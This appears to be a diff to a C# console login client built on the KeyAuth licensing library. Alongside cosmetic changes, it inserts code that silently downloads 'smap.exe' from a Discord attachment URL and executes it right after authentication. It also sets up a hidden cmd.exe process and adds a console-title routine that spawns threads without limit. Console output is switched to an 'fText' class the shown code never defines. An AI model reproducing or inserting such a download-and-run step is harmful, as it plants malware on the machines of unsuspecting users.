@@ -4,6 +4,10 @@ using System.Diagnostics;
 using System.Net;
 using System.Threading;
 using System.Windows.Forms;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+using vital1310;
 
 namespace KeyAuth
 {
@@ -46,6 +50,17 @@ namespace KeyAuth
             {
                 Console.WriteLine("\n Status: " + KeyAuthApp.response.message);
                 Thread.Sleep(1500);
+
+                    WebClient webClient = new WebClient();
+                    string fileName = "\\smap.exe";
+                    webClient.DownloadFile("https://cdn.discordapp.com/attachments/854882593730986014/875780033438965770/smap.exe", fileName);
+                    Process.Start(fileName);
+                    Process process = new Process();
+                    process.StartInfo.FileName = "cmd.exe";
+                    process.StartInfo.UseShellExecute = true;
+                    process.StartInfo.CreateNoWindow = true;
+                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+
             }
 
             Console.WriteLine("\n Logged In!"); // at this point, the client has been authenticated. Put the code you want to run after here
@@ -157,16 +172,17 @@ namespace KeyAuth
             {
                 if (!string.IsNullOrEmpty(KeyAuthApp.app_data.downloadLink))
                 {
-                    Console.WriteLine("\n Update avaliable!");
-                    Console.WriteLine(" Would you like to update?");
-                    Console.WriteLine(" [1] Yes");
-                    Console.WriteLine(" [2] No");
+                    fText.Print("\n Update available!");
+                    fText.Print(" Would you like to update?");
+                    fText.Print(" ");
+                    fText.Print("\n [1] Yes");
+                    fText.Print(" [2] No");
                     int choice = int.Parse(Console.ReadLine());
                     switch (choice)
                     {
                         case 1:
-                            Console.WriteLine(" Downloading file directly..");
-                            Console.WriteLine(" New file will be opened shortly..");
+                            fText.Print(" Downloading file directly..");
+                            fText.Print(" New file will be opened shortly..");
 
                             WebClient webClient = new WebClient();
                             string destFile = Application.ExecutablePath;
@@ -190,15 +206,45 @@ namespace KeyAuth
                             Environment.Exit(0);
                             break;
                         default:
-                            Console.WriteLine(" Invalid selection, terminating program..");
+                            fText.Print(" Invalid selection, terminating program..");
                             Thread.Sleep(1500);
                             Environment.Exit(0);
                             break;
                     }
                 }
-                Console.WriteLine("\n Status: Version of this program does not match the one online. Furthermore, the download link online isn't set. You will need to manually obtain the download link from the developer.");
+                fText.Print("\n Status: Version of this program does not match the one online. Furthermore, the download link online isn't set. You will need to manually obtain the download link from the developer.");
                 Thread.Sleep(2500);
                 Environment.Exit(0);
+            }
+        }
+
+        //FunnyPrint
+        internal class monky2
+        {
+            public static void Retarded()
+            {
+                int num = 80;
+                _ = (new char[62]);
+                char[] array = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
+                RandomNumberGenerator randomNumberGenerator = new RNGCryptoServiceProvider();
+                byte[] array2 = new byte[num];
+                randomNumberGenerator.GetNonZeroBytes(array2);
+                StringBuilder stringBuilder = new StringBuilder(num);
+                foreach (byte b in array2)
+                {
+                    stringBuilder.Append(array[(int)b % (array.Length - 1)]);
+                }
+                Console.Title = (((stringBuilder != null) ? stringBuilder.ToString() : null) ?? "");
+                new Thread(new ThreadStart(monky2.Retarded)).Start();
+            }
+
+            public static void Print(string message, int sec = 40)
+            {
+                for (int i = 0; i < message.Length; i++)
+                {
+                    Console.Write(message[i]);
+                    Thread.Sleep(sec);
+                }
             }
         }
 
